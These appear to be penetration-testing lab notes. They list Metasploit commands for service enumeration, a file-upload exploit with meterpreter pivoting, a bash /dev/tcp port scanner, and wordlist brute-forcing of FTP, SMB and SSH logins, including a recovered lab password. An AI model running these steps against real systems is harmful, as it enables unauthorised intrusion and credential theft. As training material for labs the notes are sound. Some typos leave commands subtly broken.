### Port Scanning with Auxiliary Modules
auxiliary module used to discover multiple ports and service on target

### T1046 Network Service Scanning
	ip addr
	nmap ip
	curl ip
	msfconsole
	use exploit/unix/webapp/xoda_file_upload
	set RHOSTS ip
	set TARGETURI /
	exploit
	(in the meterpret exploit session)
	shell
	ip addr
	run autoroute -s ip
	use auxiliary/scanner/portscan/tcp
	set RHOSTS ip
	set verbose true
	set ports 1-1000
	exploit
	ls -l /root/tools/static-binaries
	nano bash-port-scanner.sh 
	#!/bin/bash
	for port in {1..1000}; do
	timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
	done
	cat bash-port-scanner.sh
	use auxiliary/scanner/portscan/tcp
	sessions -i 1
	(in meterpreter session)
	upload /root/tools/static-binaries /nmap/tmp/nmap
	upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
	cd /tmp/
	chmod +x ./nmap ./bash-port-scanner.sh
	./bash-port-scanner ip
	./nmap -p- ip


### FTP Enumeration
	ifconfig
	msfconsole
	use auxiliary/scanner/ftp/ftp_version
	set RHOSTS ip
	exploit
	use auxiliary/scanner/ftp/ftp_login
	set RHOSTS ip
	set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
	set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
	exploit
	use auxiliary/scanner/ftp/anonymous
	set RHOSTS ip
	exploit
	ftp ip

### SMB Enumeration 
	ifconfig
	service postgresql start
	msfconsole
	workspace -a SMB_ENUM
	setg RHOSTS ip
	search type:auxiliary name:smb
	exploit
	use auxiliary/scanner/smb/smb_enumusers
	info
	exploit
	set ShowFiles true
	use auxiliary/scanner/smb/smb_login
	set RHOSTS ip
	set SMBUser admin
	set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
	exploit
	exit
	smbclient -L \\ip\public -U admin
	ls
	cd secret
	get flag
	cat flag


### Web server Enumeration
	ifconfig
	service postgresql start
	msfconsole
	setg RHOSTS ip
	search http
	search type:auxiliary name:http
	use auxiliary/scanner/http/http_version
	show options
	exploit
	search http_header
	use auxiliary/scanner/http/http_header
	exploit
	use auxiliary/scanner/http/robots.txt
	exploit
	use auxiliary/scanner/http/http_header
	set TARGETURl /secure
	exploit
	use auxiliary/scanner/http/brute_dirs
	exploit
	use auxiliary/scanner/http/dir_scanner
	set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
	exploit
	use auxiliary/scanner/http/dir_listing
	set PATH /data
	exploit
	use auxiliary/scanner/http/files_dir
	set VERBOSE false
	exploit
	use auxiliary/scanner/http/http_put
	set PATH /data
	set FILENAME test.txt
	set FILEDATA "Welcome To AttackDefense"
	exploit
	use auxiliary/scanner/http/http_put
	set PATH /data
	set FILENAME test.txt
	set ACTION DELETE
	exploit
	use auxiliary/scanner/http/http_login
	set AUTH_URl /secure/
	set VERBOSE false
	exploit
	use auxiliary/scanner/http/apache_userdir_enum
	set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
	set VERBOSE false
	exploit
	- auxiliary/scanner/http/apache_userdir_enum
	- auxiliary/scanner/http/brute_dirs
	- auxiliary/scanner/http/dir_scanner
	- auxiliary/scanner/http/dir_listing
	- auxiliary/scanner/http/http_put
	- auxiliary/scanner/http/files_dir
	- auxiliary/scanner/http/http_login
	- auxiliary/scanner/http/http_header
	- auxiliary/scanner/http/http_version
	- auxiliary/scanner/http/robots_txt

MySQL enumeration
=
	0. auxiliary/scanner/mysql/mysql_versoion
	1. auxiliary/scanner/mysql/mysql_login
	2. auxiliary/admin/mysql/mysql_enum
	3. auxiliary/admin/mysql/mysql_sql
	4. auxiliary/scanner/mysql/mysql_file_enum
	5. auxiliary/scanner/mysql/mysql_hashdump
	6. auxiliary/scanner/mysql/mysql_schemadump
	7. auxiliary/scanner/mysql/mysql_writable_dirs



### SSH Enumeration
	nmap -sV -O ip
	service postgresql staart
	msfconsole
	setg RHOSTS ip
	use auxiliary/scanner/ssh/ssh_version
	exploit
	use auxiliary/scanner/ssh/ssh_login
	set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
	set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
	set STOP_ON_SUCCESS true
	exploit
	(username: sysadmin, password: hailey)
	ssh sysadmin@ip
	find / -name "flag"
	cat /flag

## SMTP Enumeration
simple mail transfer protocol is a communication protocol that is used for the transmission of email port (25)

	nmap -sV --script banner ip
	nc ip
	VRFY admin@openmailbox.xyz
	VRFY commander@openmailbox.xyz
	telnet ip
	HELO attacker.xyz
	EHLO attacker.xyz
	smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t ip
	msfconsole
	use auxiliary/scanner/smtp/smtp_enum
	set RHOSTS ip
	exploit
	

